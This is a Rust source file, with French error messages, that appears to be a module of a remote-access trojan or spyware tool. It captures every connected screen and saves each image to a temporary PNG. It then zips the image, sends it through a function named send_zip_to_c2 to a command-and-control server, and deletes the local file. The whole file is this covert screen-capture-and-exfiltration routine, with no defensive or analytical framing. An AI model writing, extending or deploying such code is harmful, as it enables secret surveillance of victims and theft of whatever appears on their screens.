use crate::connexion::{self, zip_file};
use screenshots::Screen;
use std::path::PathBuf;
use tempfile::NamedTempFile;

pub async fn take_screenshot() {
    let screens = match Screen::all() {
        Ok(s) => s,
        Err(e) => {
            eprintln!("Erreur lors de la récupération des écrans : {}", e);
            return;
        }
    };

    for screen in screens {
        let image = match screen.capture() {
            Ok(img) => img,
            Err(e) => {
                eprintln!(
                    "Erreur lors de la capture de l'écran {} : {}",
                    screen.display_info.id, e
                );
                continue;
            }
        };

        let tmpfile = match NamedTempFile::new() {
            Ok(f) => f,
            Err(e) => {
                eprintln!("Erreur création fichier temporaire : {}", e);
                continue;
            }
        };

        let mut png_path = PathBuf::from(tmpfile.path());
        png_path.set_extension("png");

        if let Err(e) = image.save(&png_path) {
            eprintln!("Erreur lors de la sauvegarde de l'image : {}", e);
            continue;
        }

        if let Err(e) = process_screenshot(&png_path).await {
            eprintln!("Erreur lors du traitement de la capture : {}", e);
        }
    }
}

async fn process_screenshot(png_path: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    zip_file(png_path).await?;

    if let Some(path_str) = png_path.to_str() {
        println!("Fichier créé : {:?}", path_str);
    } else {
        return Err("Chemin de fichier invalide".into());
    }
    
    connexion::send_zip_to_c2(png_path.to_str().unwrap()).await?;

    std::fs::remove_file(png_path)?;

    Ok(())
}
